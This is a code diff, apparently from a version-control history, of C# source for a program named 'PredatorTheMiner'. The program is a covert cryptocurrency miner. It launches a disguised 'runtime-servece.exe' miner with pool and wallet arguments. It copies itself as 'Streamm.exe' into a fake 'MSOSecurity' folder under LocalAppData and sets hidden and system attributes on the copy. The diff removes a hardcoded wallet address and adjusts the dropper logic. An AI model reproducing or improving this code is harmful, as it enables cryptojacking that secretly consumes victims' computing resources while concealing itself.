@@ -1,4 +1,4 @@
-﻿using System;
+using System;
 using System.Diagnostics;
 using System.IO;
 using System.Threading;
@@ -7,11 +7,6 @@ namespace PredatorTheMiner
 {
 	class Program
 	{
-		public static string User()
-		{
-			return "48ChbTLzkwRB3zfrMxLM9FMkvgjp9g9aTQtUQog1ZS6rYZJ6J59nZBn6s6VegEjyxTT3FJtqEo83zSEPs9qDUUsbDdVMYXh";
-		}
-
 		public static string StartPath
 		{
 			get
@@ -45,17 +40,17 @@ namespace PredatorTheMiner
 				process.StartInfo.UseShellExecute = false;
 				process.StartInfo.Arguments = string.Format("--url={0} --user={1} --pass={4} --threads 5 --donate-level=1 " +
 					"--keepalive --retries=5 --max-cpu-usage={3}",
-					Pool, User(), "0x3", cpu_usage, password);
+					Pool, user, "0x3", cpu_usage, password);
 				process.StartInfo.FileName = StartDir + "\\runtime-servece.exe";
 				/* Запуск майнера через cmd */
-				user.Contains("");
+				
 				if (!StartDir.Contains(Environment.GetEnvironmentVariable("LocalAppData")))
 				{
 					try
 					{
 						string drop_folder = Environment.GetEnvironmentVariable("LocalAppData") + "\\MSOSecurity";
 						if (Directory.Exists(drop_folder))
-							Directory.Delete(drop_folder, true); // TODO: Replace this string with 'return' keyword
+							return;
 						Directory.CreateDirectory(drop_folder);
 						File.Copy(StartPath, drop_folder + "\\Streamm.exe");
 						File.SetAttributes(drop_folder + "\\Streamm.exe", FileAttributes.Hidden | FileAttributes.System);
